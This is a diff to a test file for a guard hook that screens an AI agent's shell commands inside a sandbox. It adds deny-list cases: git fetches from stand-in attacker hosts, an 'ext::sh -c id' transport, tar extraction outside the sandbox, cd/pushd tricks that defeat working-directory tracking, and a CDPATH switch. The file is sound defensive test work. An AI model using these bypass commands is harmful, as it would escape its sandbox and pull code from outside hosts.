@@ -44,6 +44,7 @@ const FX = fixture();
 symlinkSync('/etc', join(FX.tmp, 'link-to-etc'));
 symlinkSync(FX.run, join(FX.tmp, 'lnk-run'));
 symlinkSync(FX.tmp, join(FX.tmp, 'lnk-self')); // a link back to the temp dir itself
+mkdirSync(join(FX.tmp, 'exists')); // a directory that exists, for `cd` followed by `;`
 const T = FX.tmp, R = FX.run, MD = FX.md, SK = FX.sk;
 const SKILL_DIR = join(ROOT, 'skills', 'zero-trust-review'), SANDBOX = join(SKILL_DIR, 'sandbox-run.mjs'), NOTE = join(SKILL_DIR, 'note.mjs');
 const guardIn = (command, extra = {}) => ({ hook_event_name: 'PreToolUse', tool_name: 'Bash', agent_id: 'agent-1', cwd: '/work/repo', tool_input: { command }, ...extra });
@@ -323,6 +324,22 @@ const BYPASS_DENY = [
   `docker run --name zt-a --network none --net host img`, `docker run --name zt-a --network none --network host img`, `docker run --name zt-a --network none -v/:/x img`,
   `docker run --name zt-a --network none --rm --init --userns host img`, `docker run --name zt-a --network none --ipc host img`, `docker run --name zt-a --network none --uts=host img`,
   `docker run --name zt-a --network none --restart always img`, `docker run --name zt-a --network none -l a=b img`, `docker run --name zt-a --network none --pull always img`,
+  // tar --one-top-level=DIR extracts into DIR, whatever -C or the cwd say
+  `tar -xf a.tar --one-top-level=/tmp/evil-outside -C ${T}/x`, `cd ${T}/x && tar --one-top-level=/tmp/evil-outside -xf archive.tar`, `tar -xf a.tar --one-top-level -C ${T}/x`,
+  // git fetch / ls-remote: the repository must be a bare remote NAME (a configured remote); a URL, scp-like address, ext:: transport or path can reach any host
+  `git fetch https://attacker.example/repo.git refs/heads/main`, `git ls-remote https://attacker.example/repo.git`, `git fetch --depth 1 https://attacker.example/x main`,
+  `git fetch 'ext::sh -c id' main`, `git fetch git@evil.example:org/repo.git`, `git fetch ssh://h/x`, `git fetch file:///etc`, `git fetch /tmp/x`, `git fetch ./x`, `git fetch ~/x`,
+  `git fetch ../x`, `git fetch -q origin main https://evil.example/x`, `git ls-remote --heads https://evil.example/x`, `git ls-remote -- https://evil.example/x`, `git fetch -- https://evil.example/x`,
+  `git fetch "$X"`, `git fetch evil.example.com:path`, `git fetch origin 'ext::sh -c id'`, `git fetch -j 4 https://evil.example/x`, `git fetch --filter=blob:none http://evil.example/x`,
+  // cwd tracking: a `cd` that runs in a subshell (group, pipeline, background, substitution), is undone (popd), is not the shell's (env/nice/timeout/nohup cd) or fails
+  `(cd ${T}/sub); touch evil`, `(cd ${T}/sub); mkdir evil`, `(cd ${T}/sub); tee evil`, `(cd ${T}/exists); touch evil`, `cd ${T}/sub & touch evil`, `cd ${T}/exists & touch evil`,
+  `cd ${T}/sub &\ntouch evil`, `{ cd ${T}/exists & }; touch evil`, `cd ${T}/exists | cat; touch evil`, `echo $(cd ${T}/exists); touch evil`, 'echo `cd ' + T + '/exists`; touch evil',
+  `cd /work/repo && pushd ${T}/sub && popd && touch evil`, `pushd ${T}/exists; popd; touch evil`, `pushd ${T}/exists && popd && touch evil`, `pushd +1; touch evil`, `pushd; touch evil`,
+  `env cd ${T}/exists; touch evil`, `nice cd ${T}/exists; touch evil`, `timeout 5 cd ${T}/exists; touch evil`, `nohup cd ${T}/exists; touch evil`, `stdbuf -oL cd ${T}/exists; touch evil`,
+  `cd ${T}/nonexistent; touch evil`, `cd ${T}/nonexistent || touch evil`, `cd ${T}/nonexistent && echo hi; touch evil`, `cd ${T}/nonexistent\ntouch evil`, `cd ${T}/nonexistent && echo hi || touch evil`,
+  `cd ${T}/exists || cd ${T}/other; touch evil`, `cd ${T}/exists && echo; cd ${T}/gone; touch evil`, `rm -rf ${T}/exists; cd ${T}/exists; touch evil`, `mv ${T}/exists ${T}/e2; cd ${T}/exists; touch evil`,
+  `export CDPATH=${T}; cd exists; touch evil`, `CDPATH=${T} cd exists; touch evil`, `cd -; touch evil`, `cd; touch evil`, `cd "$X"; touch evil`,
+  `cd ${T}/x && mkdir d; touch evil`, `cd ${T}/x && ls; touch evil`, `cd ${T}/x && ls | head; touch evil`, `popd; touch evil`, `cd ${T}/x && (cd ..); touch evil`,
   // (6) mv/cp -t / --target-directory in every spelling: attached, `=`, bundled, abbreviated, ledger/run-folder targets
   `mv --target-directory=/etc ${T}/f`, `mv -t/etc ${T}/f`, `mv -t /etc ${T}/f`, `mv --target-directory /etc ${T}/f`, `mv --target=/etc ${T}/f`, `mv --t=/etc ${T}/f`, `mv -ft/etc ${T}/f`,
   `cp -t/etc a`, `cp -at /etc a`, `cp -rt/etc a`, `cp -pt /etc a`, `cp --target-directory=/etc a`, `cp --target-directory /etc a`, `cp --target=/etc a`, `cp --targ /etc a`,
@@ -350,12 +367,20 @@ const BYPASS_ALLOW = [
   `git -C /work/repo log`, `git -C /work/repo -C sub log`, `git --git-dir=/work/repo/.git log`, `git --git-dir /work/repo/.git --work-tree /work/repo status`, `git --work-tree=/work/repo status`,
   `cd /work/repo && git log`, `git diff --stat`, `git fetch -q origin main`, `git archive HEAD | tar -x -C ${T}/src`, `git show HEAD:a > ${T}/a`, `git archive --format=tar HEAD`, `git archive --prefix=p/ HEAD`, `git archive -9 HEAD`, `git archive -l`,
   `tar -xf a.tar -C ${T}/x`, `tar -xzf a.tgz -C ${T}/x --strip-components=1`, `tar -xvf a.tar -C ${T}/x`, `tar -xpf a.tar -C ${T}/x`, `tar -xkf a.tar -C ${T}/x`, `tar -xmf a.tar -C ${T}/x`,
-  `tar -xOf a.tar -C ${T}/x member`, `tar -tvf a.tar`, `tar -xf a.tar -C ${T}/x --exclude='*.o' --exclude=x`, `tar -xf a.tar --one-top-level=out -C ${T}/x`,
+  `tar -xOf a.tar -C ${T}/x member`, `tar -tvf a.tar`, `tar -xf a.tar -C ${T}/x --exclude='*.o' --exclude=x`,
   `docker run -d --name zt-pg --network none -e POSTGRES_PASSWORD=x postgres:15`, `docker run --rm --name zt-a --network=none img echo hi`, `docker run --name zt-a --net none --memory 512m --cpus 1 img`,
   `docker run --rm -it --name zt-a --network none img sh`, `docker run -d --name=zt-a --network none --env A=1 --env B=2 img`, `docker run --name zt-a --network none -m 512m --pids-limit 100 --read-only img`,
   `cp -r a ${T}/b`, `cp -a /work/repo/a ${T}/x`, `cp -t ${T}/d a`, `cp -t${T}/d a`, `cp --target-directory=${T}/d a`, `cp --target-directory ${T}/d a`, `cp -rt ${T}/d a b`, `cp -v -p a ${T}/c`, `cp -n a ${T}/c`,
   `cp -R -L a ${T}/c`, `cp -rp a ${T}/c`, `cp --recursive --preserve=mode a ${T}/c`, `cp -f -i a ${T}/c`, `cp -- a ${T}/c`, `cp -T a ${T}/c`, `cp -u a b ${T}/d`,
   `mv -f ${T}/a ${T}/b`, `mv -t ${T}/d ${T}/a ${T}/b`, `mv --target-directory=${T}/d ${T}/a`, `mv -v -n ${T}/a ${T}/b`, `mv -ft ${T}/d ${T}/a`, `mv -- ${T}/a ${T}/b`, `mv -T ${T}/a ${T}/b`, `mv -i -u ${T}/a ${T}/b`,
+  `git fetch origin refs/merge-requests/7/head`, `git fetch -q origin main`, `git fetch origin main:mr7`, `git fetch`, `git fetch --all`, `git fetch --depth 1 origin main`, `git fetch --depth=1 origin`,
+  `git ls-remote origin`, `git ls-remote --heads origin main`, `git ls-remote`, `git fetch upstream 'refs/heads/*:refs/remotes/upstream/*'`, `git fetch -p origin`, `git fetch origin +refs/heads/a:refs/heads/b`,
+  `git fetch -j 4 origin`, `git fetch --filter=blob:none origin`, `git remote show origin`,
+  // cwd tracking that stays exact: `;` / newline after a cd to a directory that EXISTS, `&&` chains, groups, pushd/popd pairs, builtin wrappers
+  `cd ${T}/exists; touch f`, `cd ${T}/exists\ntouch f`, `cd ${T}/x && touch f`, `(cd ${T}/x && touch f)`, `(cd ${T}/x); touch ${T}/abs`, `cd ${T}/x && touch a && touch b`,
+  `cd ${T}/exists && touch a; touch b`, `cd ${T}/x && mkdir d && cd d && touch f`, `pushd ${T}/x && touch f`, `cd ${T}/x && (cd sub && touch f) && touch g`, `cd /work/repo && git log`,
+  `(cd /work/repo && git log -1)`, `cd ${T}/x && ls | head`, `command cd ${T}/x && touch f`, `builtin cd ${T}/x && touch f`, `time cd ${T}/x && touch f`, `cd ${T}/exists && touch a | cat`,
+  `cd ${T}/exists; (cd /work/repo && git log); touch f`, `(cd ${T}/exists; touch f)`, `cd ${T}/exists && { touch f; touch g; }`, `cd ${T}/exists/..; touch evil-but-inside-temp`, `echo $(cd ${T}/x && pwd); touch ${T}/abs`,
   `sort -u f`, `sort -k2,2 -t: -n f`, `sort -nr f`, `sort -rn -k3 f`, `sort --unique --reverse f`, `sort --key=2 --field-separator=: f`, `sort -c f`, `sort -V f`, `sort -h f`, `sort -f -d -b f`,
 ];
 for (const c of BYPASS_ALLOW) test(`guard allows after the allow-lists: ${show(c)}`, () => assert.equal(verdict(bash(c)), 'allow'));
@@ -368,7 +393,9 @@ const STEERING = ['ZT_SANDBOX_FORCE', 'ZT_TESTS_ONLY', 'ZT_SANDBOX_PLAN', 'ZT_RU
   'GIT_ASKPASS', 'GIT_EXEC_PATH', 'GIT_PROXY_COMMAND', 'GIT_TEMPLATE_DIR', 'PAGER', 'EDITOR', 'VISUAL',
   // which repo (and so which .git/config) git reads, and files it writes
   'GIT_DIR', 'GIT_WORK_TREE', 'GIT_COMMON_DIR', 'GIT_INDEX_FILE', 'GIT_OBJECT_DIRECTORY', 'GIT_ALTERNATE_OBJECT_DIRECTORIES', 'GIT_CEILING_DIRECTORIES', 'GIT_CONFIG',
-  'GIT_TRACE', 'GIT_TRACE2', 'GIT_TRACE2_EVENT', 'GIT_TRACE_PACKET', 'GIT_REDIRECT_STDERR'];
+  'GIT_TRACE', 'GIT_TRACE2', 'GIT_TRACE2_EVENT', 'GIT_TRACE_PACKET', 'GIT_REDIRECT_STDERR',
+  // `cd NAME` searches CDPATH first
+  'CDPATH'];
 for (const v of STEERING) {
   for (const c of [`${v}=1 node ${SANDBOX} --cwd /r -- ls`, `env ${v}=1 git log`, `export ${v}=1 && ls`]) {
     test(`guard denies env switch: ${c}`, () => {
